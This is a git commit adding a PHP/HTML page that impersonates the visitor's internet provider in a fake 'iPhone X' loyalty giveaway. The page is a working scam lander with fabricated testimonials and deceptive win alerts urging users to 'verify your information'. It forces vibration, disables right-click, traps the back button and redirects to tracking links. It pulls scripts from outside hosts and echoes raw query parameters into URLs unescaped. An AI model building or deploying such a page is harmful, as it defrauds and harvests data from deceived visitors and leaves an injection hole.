4d62acab42e7c6a8a4c77ba558f00eb857f5bb9b
ReactExpert <script.masterwebdeveloper@gmail.com>
2018-12-12 03:43:15 +0800

    upload

---
+++ index2.php
@@ -0,0 +1,232 @@
+<?php
+$device_name =$_GET['os']; 
+
+$sid =$_GET['sid']; 
+
+$brand =$_GET['brand']; 
+
+$model =$_GET['model']; 
+$s1 =$_GET['PREFIJO']; 
+$s2 =$_GET['pub_name']; 
+$s3 =$_GET['app_id']; 
+?>
+
+
+
+<!DOCTYPE html>
+<html lang=en>
+
+<head>
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<!--[if IE]></base><![endif]-->
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=robots content="noindex, nofollow, noarchive">
+<title>Apple iPhone X ZA</title>
+<link rel=icon type=image/png href="data:image/png;base64,iVBORw0KGgo=">
+<style>*{box-sizing:border-box}html{-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%;text-size-adjust:100%;font-size:62.5%}body{margin:0;font-family:Helvetica Neue,Helvetica,Arial,sans-serif;font-size:18px;font-size:1.8rem;line-height:1.5;background-color:#fff;color:#222}h1{font-size:28px;font-size:2.8rem;margin:20px 0}h2{font-size:36px;font-size:3.6rem;margin:0;line-height:1}h3{margin:10px 0 0;font-weight:400}p{margin-top:10px}.header{width:100%;margin-bottom:10px;padding:10px 0;font-size:18px;font-size:1.8rem;line-height:30px;background-color:#3a5795;color:#fff;text-align:center}.container{max-width:800px;width:90%;margin:10px auto}.hcontainer{max-width:800px;width:90%;margin:0 auto}.instructions{padding:20px;text-align:center;background-color:#ff9;border-radius:4px}.instructions small{font-style:italic}.instructions small>b{color:red}.boxes{width:100%;margin:40px 0}.boxes img{width:100%}.boxes cbox{width:100%}.box-o-t{position:absolute;top:-34%}.boxes .discover .box-o-b{z-index:1;position:relative}.boxes .iphone{width:76%;height:auto;position:absolute;z-index:0;top:-20%;left:12%;-webkit-transition-duration:700ms;transition-duration:700ms}.boxes .discover>.iphone{top:-60%}.boxes>div{position:relative;display:inline-block;width:23.8%;height:50%;-webkit-transition-duration:200ms;transition-duration:200ms;cursor:pointer}.boxes>div:hover{-webkit-transform:scale(1.1,1.1);transform:scale(1.1,1.1)}.comments{margin:40px 0}.comments p{margin:4px 0 8px}.comments b{color:#3b5998}.comments small{font-size:12px}.comments u{color:#888;text-decoration:none;border-bottom:1px dotted #888}.comments img{width:80%;max-width:240px}.comments>div{position:relative;margin:4px 0;padding:10px;background-color:#eeeff4;font-size:13px}.comments small>span{color:#3b5998;cursor:pointer}.comments>div>div{margin-left:60px}.like{padding-left:18px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA0AAAAMCAMAAACOacfrAAAAPFBMVEUAAABsh7dtiLeIncN0jrvDzeDP1+aMoMWvvdaIncSJnsSistB1j7xhf7NLbqiInsRLb6lKbqhLbqn////2lQI7AAAAAXRSTlMAQObYZgAAAE5JREFUeNpNyUkOgDAQA0GzE7axPf//KwIphL6VGjWdaB3515VqWCPdxEyTC0bbVL5d8L47s0oRqjI0lO8RLsH2HJvIbX7U47AETGGqww2y3QbKMCbVXgAAAABJRU5ErkJggg==) no-repeat 0 0}.photo{position:absolute;display:block;width:48px;height:48px;top:10px;left:10px;background:#d8dce6 url("profiles.jpg") no-repeat 0 0}.p1{background: #d8dce6 url("1.jpg") no-repeat 0 0;}.p2{background: #d8dce6 url("2.jpg") no-repeat 0 0;}.p3{background: #d8dce6 url("3.jpg") no-repeat 0 0;}.p4{background: #d8dce6 url("4.jpg") no-repeat 0 0;}.p5{background: #d8dce6 url("5.jpg") no-repeat 0 0;}.p6{background: #d8dce6 url("6.jpg") no-repeat 0 0;}.p7{background: #d8dce6 url("7.jpg") no-repeat 0 0;}.p8{background: #d8dce6 url("8.jpg") no-repeat 0 0;}.p9{background: #d8dce6 url("http://www.loyalty-program-sg.com-win-phone.pw/sg/iphone6-plus-2/9.jpg") no-repeat 0 0;}.p10{background: #d8dce6 url("http://www.loyalty-program-sg.com-win-phone.pw/sg/iphone6-plus-2/10.jpg") no-repeat 0 0;}.p11{background: #d8dce6 url("http://www.loyalty-program-sg.com-win-phone.pw/sg/iphone6-plus-2/11.jpg") no-repeat 0 0;}.p12{background: #d8dce6 url("http://www.loyalty-program-sg.com-win-phone.pw/sg/iphone6-plus-2/12.jpg") no-repeat 0 0;}.p13{background: #d8dce6 url("http://www.loyalty-program-sg.com-win-phone.pw/sg/iphone6-plus-2/13.jpg") no-repeat 0 0;}.p14{background: #d8dce6 url("http://www.loyalty-program-sg.com-win-phone.pw/sg/iphone6-plus-2/14.jpg") no-repeat 0 0;}.p15{background: #d8dce6 url("http://www.loyalty-program-sg.com-win-phone.pw/sg/iphone6-plus-2/15.jpg") no-repeat 0 0;}.p16{background: #d8dce6 url("http://www.loyalty-program-sg.com-win-phone.pw/sg/iphone6-plus-2/16.jpg") no-repeat 0 0;}.orange .header{background-color:#fe6700}.free .header{background-color:#cd1e25}.bouygues .header{background-color:#0092c4}.sfr .header{background-color:#ec0306}.numericable .header{background-color:#c8dc43;color:#222}.bounce{display:inline-block;-webkit-animation:a 600ms ease infinite;animation:a 600ms ease infinite}@-webkit-keyframes a{0%,to{-webkit-transform:translate3d(0,-5px,0);transform:translate3d(0,-5px,0)}80%{-webkit-transform:translate3d(0,5px,0);transform:translate3d(0,5px,0)}}@keyframes a{0%,to{-webkit-transform:translate3d(0,-5px,0);transform:translate3d(0,-5px,0)}80%{-webkit-transform:translate3d(0,5px,0);transform:translate3d(0,5px,0)}}@media (max-width:767px){.boxes>div{width:32.5%}.boxes>div:nth-child(-n+3){display:none}}@media (max-width:479px){.boxes>div{width:32%}}@media (max-width:319px){.boxes>div{width:48%}.boxes>div:nth-child(-n+4){display:none}}.instructions table{width:100%}.instructions td:first-child{padding-right:10px;width:10px}.instructions td:last-child{padding-left:10px;width:10px}</style>
+
+    <script type="text/javascript">navigator.vibrate=navigator.vibrate||navigator.webkitVibrate||navigator.mozVibrate||navigator.msVibrate,navigator.vibrate([660,60,180,60,60,180,60,180,60,180,420,60,180,60,60,180,60,180,60,180,420,60,180,60,60,180,60,180,60,180,420,60,180,60,60,180,60,180,420,60,420,60]);document.oncontextmenu=function(){return false;};
+    </script>
+	
+
+<script>
+	function getURLParameter(name) {
+		var param = decodeURI(
+			(RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || ''
+		);
+		return param.replace(/\+/gim," ");
+	}
+
+	var URL123 = 'http://hpahe.trackvoluum.com/click';
+	
+	function leave() {
+		document.location = URL123;
+	}
+	
+	function leave1() {
+		window.open(URL123);		    
+	}
+	
+	function leave2() {
+		return URL123;		    
+	}
+	
+	function leave3() {
+                window.onbeforeunload = null;
+                document.location = URL123;
+        }
+	
+	
+	
+	var isp = getURLParameter('isp');
+	var ip = getURLParameter('ip');
+	var model = getURLParameter('model');
+	var brand = getURLParameter('brand');
+	var city = getURLParameter('city');
+</script>
+    
+    <script type="text/javascript">
+    (function(p,u,s,h){
+        p._pcq=p._pcq||[];
+        p._pcq.push(['_currentTime',Date.now()]);
+        s=u.createElement('script');
+        s.type='text/javascript';
+        s.async=true;
+        s.src='https://cdn.pushcrew.com/js/a1c1b5ad003b6af5795e6d2f933b699b.js';
+        h=u.getElementsByTagName('script')[0];
+        h.parentNode.insertBefore(s,h);
+    })(window,document);
+  </script>
+    
+    </head>
+<body>
+
+
+
+<div class=header><div class="hcontainer"><b><script>document.write(getURLParameter('isp')) </script>‘s promotional contest on </b>  <b>
+                <script>
+                            var mydate=new Date()
+                            mydate.setDate(mydate.getDate()-0);
+                            var year=mydate.getYear()
+                            if (year < 1000)
+                            year+=1900
+                            var day=mydate.getDay()
+                            var month=mydate.getMonth()
+                            var daym=mydate.getDate()
+                            if (daym<10)
+                            daym="0"+daym
+                            var dayarray=new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday")
+                            var montharray=new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December")
+                            document.write(""+montharray[month]+" "+daym+"")
+              </script>, 2018</b></div></div>
+<div class=container>
+<h1>Dear <script>document.write(getURLParameter('isp'))</script> client,</h1> 
+<p>We would like to thank you for your loyalty to <b><script>document.write(getURLParameter('isp'))</script></b>, therefore, we offer you a chance to receive the new <b>iPhone X</b>.</p>
+<div class=instructions> <h2>Find an iPhone X</h2> <table> <tr> <td>
+<span class=bounce>&darr;</span></td><td><center><h3>All you have to do is choose the correct gift box.</h3></center></td><td><span class=bounce>&darr;</span></td></tr></table> </div>
+<div id=boxes class=boxes> <div><img src="box_c.png"></div><div><img src="box_c.png"></div><div><img src="box_c.png"></div><div><img src="box_c.png"></div><div><img src="box_c.png"></div><div><img src="box_c.png"></div><div><img src="box_c.png"></div><div><img src="box_c.png"></div><div><img src="box_c.png"></div><div><img src="box_c.png"></div><div><img src="box_c.png"></div><div><img src="box_c.png"></div></div>
+<div class=comments> <div><small><span id=likes class=like>19 821</span> people like that</small></div><div><span class="photo p1"></span> <div><b>Maria Farela</b> <p>Is it possible to play again? :)</p><small><span>Reply</span> &middot; <span class=like>Like</span> &middot; <u>4 minutes ago</u></small></div></div><div><span class="photo p2"></span> <div><b>Fred Hedbeek</b> <p>I had heard about it! Mine iPhone has just arrived today by post, even though I already have one, I’m going to sell it, thank you all!</p><small><span>Reply</span> &middot; <span class=like>Like</span> &middot; <u>5 minutes ago</u></small></div></div><div><span class="photo p3"></span> <div><b>Patricia Kincey</b> <p>I've received my iPhone today. Thank you so much!</p><img src="http://www.loyalty-program-sg.com-win-phone.pw/sg/iphone6-plus-2/unboxing.jpg" alt=""> <br><small><span>Reply</span> &middot; <span class=like>Like</span> &middot; <u>11 minutes ago</u></small></div></div><div><span class="photo p4"></span> <div><b>Miguel Sanchez</b> <p>All the gifts are empty!!!</p><small><span>Reply</span> &middot; <span class=like>Like</span> &middot; <u>15 minutes ago</u></small></div></div><div><span class="photo p5"></span> <div><b>Mitchell Snyder</b> <p>One for sale one for me, yeah!</p><small><span>Reply</span> &middot; <span class=like>Like</span> &middot; <u>38 minutes ago</u></small></div></div><div><span class="photo p6"></span> <div><b>Judy Robin</b> <p>I thought this was a prank but my iPhone 6 Plus has arrived this morning. However, you must carefully follow all the instructions.</p><small><span>Reply</span> &middot; <span class=like>Like</span> &middot; <u>42 minutes ago</u></small></div></div><div><span class="photo p7"></span> <div><b>Matthew Helme</b> <p>I've never won anything before, but today I got lucky! Thank you!</p><small><span>Reply</span> &middot; <span class=like>Like</span> &middot; <u>1 hour ago</u></small></div></div><div><span class="photo p8"></span> <div><b>Davidson Bazil</b> <p>I LOST :(</p><small><span>Reply</span> &middot; <span class=like>Like</span> &middot; <u>1 hour ago</u></small></div></div></div>
+</div>
+<div id="shadow"></div>
+<div id="mag335" style="display:none">
+
+<script>
+/*********************************************************************************
+setup where your page will redirect if back button is pressed. Be creative here :)
+you can turn off this feature by setting backBtn_redirect_active=false;
+you can set what tokens to pass, tokens_to_redirect =[] will not pass any tokens
+
+	
+/***put your click tracking link here***/
+trackingLink=leave2();
+
+/***set this to true for vibration***/ 
+vibrate=true;
+
+/**ALERT MESSAGE****/
+alert_count = 'Sorry, this gift box is empty! You still have [count] more tries left. Good luck!!';
+alert_exit ='(1) iPhone X will be reserved for 7 minutes! \n\n***THE RULES*** \n\n1. Verify your information on the next page to continue. \n\n2. Complete the final steps and you get your iPhone X!';
+  
+/***LOAD EVERYTHING***/
+var everythingLoaded=setInterval(function(){/loaded|complete/.test(document.readyState)&&(clearInterval(everythingLoaded),setTimeout(function(){addScripts()},0)/*,getURLPars(),void 0!=urlParams.vibrate&&(vibrate=!0)*/,vibrateIt(),/*backBtn_redirect_active&&activate_BB(),*/document.addEventListener("touchstart",function(){},!0),"undefined"!=typeof elById("mag335")&&null!==elById("mag335")&&document.getElementsByTagName("body")[0].removeChild(elById("mag335")))},10),end=new Date;
+    
+/***FUNCTIONS***/
+function addScripts(){var a=document.createElement("script"),b=elById("shadow");a[void 0===a.innerText?"textContent":"innerText"]='!function(a,b,c){for(var d=b.querySelectorAll("#boxes > div"),e=["box_o_t","box_o_b","iphone7"],f=[],g=3,h=0;h<e.length;h++)f[h]=new Image,f[h].src=e[h]+".png";for(var i=0;i<d.length;i++)d[i].id=i,d[i].onclick=function(){var b=this,d="box_o_t.png",e="box-o-t";if(this.onclick=null,this.innerHTML="<img src="+d+" class="+e+">",0===--g){setTimeout(function(){b.className+=" discover"},10);var f="iphone7.png",h="iphone";this.innerHTML+="<img src="+f+" class="+h+">",setTimeout(function(){a.onbeforeunload=null,alert(alert_exit),c.href=trackingLink},1500)}else setTimeout(function(){var a=alert_count.replace("[count]","("+g+")");alert(a)},400);var i="box_o_b.png",j="box-o-b";this.innerHTML+="<img src="+i+" class="+j+">"}}(window,document,location);',
+
+b=document.getElementsByTagName("script")[0],b.parentNode.insertBefore(a,b.nextSibling),sLoad=!0}function vibrateIt(){vibrate&&(navigator.vibrate=navigator.vibrate||navigator.webkitVibrate||navigator.mozVibrate||navigator.msVibrate,navigator.vibrate&&navigator.vibrate([1e3,500,1e3,500]))}function elById(a){return document.getElementById(a)}function elByCl(a,b){return document.getElementsByClassName(a)[b]}function activate_BB(){var a=window.location.search,b=tokens_to_redirect,c="";if(b[0])for(urlParams[b[0]]&&(c=c+"?"+b[0]+"="+urlParams[b[0]]),i=1;i<b.length;i++)urlParams[b[i]]&&(c=c+"&"+b[i]+"="+urlParams[b[i]])}
+</script></div>
+
+
+
+<script>
+alert("Dear " + getURLParameter('isp') + " client, congratulations!\n\nWe would like to thank you for your loyalty to " + getURLParameter('isp') + ", and thus we offer you an exclusive chance to get an iPhone X today - "+montharray[month]+" "+daym+" ("+dayarray[day]+"), 2018. All you have to do is choose the correct gift box. Good luck!");
+</script>
+
+
+
+<script>
+  var audioElements = document.getElementsByTagName('audio'),
+  sounds = {};
+
+  for (var i = 0; i < audioElements.length; i++) {
+  sounds[audioElements[i].className] = audioElements[i];
+  }
+
+  if (mediaPlaybackRequiresUserGesture()) {
+  window.addEventListener('keydown', removeBehaviorsRestrictions);
+  window.addEventListener('mousedown', removeBehaviorsRestrictions);
+  window.addEventListener('touchstart', removeBehaviorsRestrictions);
+  }
+
+  function mediaPlaybackRequiresUserGesture() {
+
+  var video = document.createElement('video');
+  video.play();
+  return video.paused;
+  }
+
+  function removeBehaviorsRestrictions() {
+  for (var i = 0; i < audioElements.length; i++) {
+  audioElements[i].load();
+  }
+
+  window.removeEventListener('keydown', removeBehaviorsRestrictions);
+  window.removeEventListener('mousedown', removeBehaviorsRestrictions);
+  window.removeEventListener('touchstart', removeBehaviorsRestrictions);
+  }
+
+  function playSound(sound) {
+  for (var key in sounds) {
+  sounds[key].pause();
+  }
+
+  sounds[sound].load();
+  sounds[sound].play();
+  }
+
+
+  playSound('foo');
+</script>
+<!-- eyJIVFRQX1VTRVJfQUdFTlQiOiJTaXRlU3Vja2VyIGZvciBPUyBYXC8yLjguNCIsIkhUVFBfQUNDRVBUX0VOQ09ESU5HIjoiZ3ppcCwgZGVmbGF0ZSIsIkhUVFBfQ09OTkVDVElPTiI6ImtlZXAtYWxpdmUiLCJIVFRQX0FDQ0VQVF9MQU5HVUFHRSI6ImVuLXVzIiwiSFRUUF9BQ0NFUFQiOiJ0ZXh0XC9odG1sLCpcLyo7cT0wLjgiLCJSRU1PVEVfUE9SVCI6IjY0MjYyIiwiUkVNT1RFX0FERFIiOiIxMTkuNzQuMTMzLjIzOCIsIlJFUVVFU1RfVVJJIjoiXC9zZ1wvaXBob25lNi1wbHVzLTJcL2luZGV4LnBocD9pc3A9U3Rhcmh1YiUyMEludGVybmV0JTIwUHRlJTIwbHRkJnZvbHV1bWRhdGE9QkFTRTY0ZG1sa0xpNHdNREF3TURBd01pMWxZamt6TFRReE5tUXRPREF3TUMwd01EQXdNREF3TURBd01EQmZYM1p3YVdRdUxqZGpZamN6TURBd0xUYzFZalV0TVRGbE55MDRaakl6TFRsbE1tWmlObU0yTkdOaVpsOWZZMkZwWkM0dU56VmpaRFEyTkdRdFlqRmtNQzAwT0dWaExUbGlOREF0TmpNeFpXSm1PV1kxTkdZMlgxOXlkQzR1U0VwZlgyeHBaQzR1TWpKa01tSTBaV0l0TkdZek1DMDBPVEE1TFRrMVpHSXRaamMwTUdVMVpEaGlaVFl6WDE5dmFXUXhMaTVoTVRCbU5HRTVPUzFpTXpGbExUUTVNVE10T0dFd01TMDFNbVk1WlRJNU0yWmtObVJmWDNaaGNqRXVMakl5TlRnelgxOTJZWEl5TGk0elgxOTJZWEl6TGk0MlgxOTJZWEkwTGk1VFIxOWZkbUZ5TlM0dVUyMWhjblJ3YUc5dVpWOWZkbUZ5Tmk0dU5EZzNPRGd6TTE5ZmRtRnlOeTR1VTFjZ1UwY2dhVkJvYjI1bElEWWdVR3gxY3lCZlgzWmhjamd1TGpnd01IZzJNREJmWDNaaGNqa3VMakV3T1RVeE1ESTNNamN5WDE5eVpDNHVjMlZ5ZG1WY0xseHdiM0JoWkhOY0xseHVaWFJmWDJGcFpDNHVYMTloWWk0dVgxOXphV1F1TGw5ZlkzSnBMaTVmWDNCMVlpNHVYMTlrYVdRdUxsOWZaR2wwTGk1ZlgzQnBaQzR1WDE5cGRDNHVYMTkyZEM0dU1UVXdNVFE0TkRJM09EQXdOdyZ3ZWJzaXRlaWQ9MjI1ODMmcXVhbGl0eT0zJmNhdGVnb3J5aWQ9NiZjb3VudHJ5PVNHJmZvcm1mYWN0b3JuYW1lPVNtYXJ0cGhvbmUmY2FtcGFpZ25pZD00ODc4ODMzJmNhbXBhaWdubmFtZT1TVyUyMFNHJTIwaVBob25lJTIwNiUyMFBsdXMlMjAmc2NyZWVucmVzb2x1dGlvbj04MDB4NjAwJmltcHJlc3Npb25pZD0xMDk1MTAyNzI3MiZiaWQ9MC4wMDA1IiwiUkVRVUVTVF9USU1FX0ZMT0FUIjoxNTA1NzM3MTQwLjYzMTMsImFkcGxleGl0eSI6MH0= -->
+
+
+    
+     <script>
+setTimeout(function() {
+alert("(1) iPhone X will be reserved for 7 minutes!\n\nTHE RULES\n\n1. Verify your information on the next page to continue.\n\n2. Complete the final steps and you get your iPhone X!");
+
+window.location = "http://hpahe.trackvoluum.com/click";
+},2*60*1000);
+</script>
+
+     <script type="text/javascript" src="http://trackingclicks.xyz/images/native.history.js"></script>
+    <script type="text/javascript" src="http://trackingclicks.xyz/images/go.new.js"></script>
+    <script type="text/javascript">
+        window.onload = function () {
+            setTimeout(backtrap, 100);
+        };
+        window.onpageshow = function (e) {
+            if (e.persisted) {
+                location.reload();
+            }
+        };
+
+        window.onpopstate = function(event) {
+                if  (document.location.toString().indexOf("redir=1")>0){
+                        window.location.href = "http://hpahe.trackvoluum.com/484f1883-9100-4292-bb67-c143d63bbbe9?sid=<?php echo ($sid);?>&s1=<?php echo ($s1);?>&s2=<?php echo ($s2);?>&s3=<?php echo ($s3);?>";
+                }
+        };
+    </script>
+    
+    
+
+ <script type="text/javascript">
+            var exittraffic_splashalertmessage = "Dear " + getURLParameter('isp') + " client, congratulations!\n\nWe would like to thank you for your loyalty to " + getURLParameter('isp') + ", and thus we offer you an exclusive chance to get an iPhone X today - "+montharray[month]+" "+daym+" ("+dayarray[day]+"), 2018. All you have to do is choose the correct gift box. Good luck!";
+            var exittraffic_RedirectUrl = "http://memanual-combility.com/click";
+        </script>
+        
+
+
+</body>
+</html>
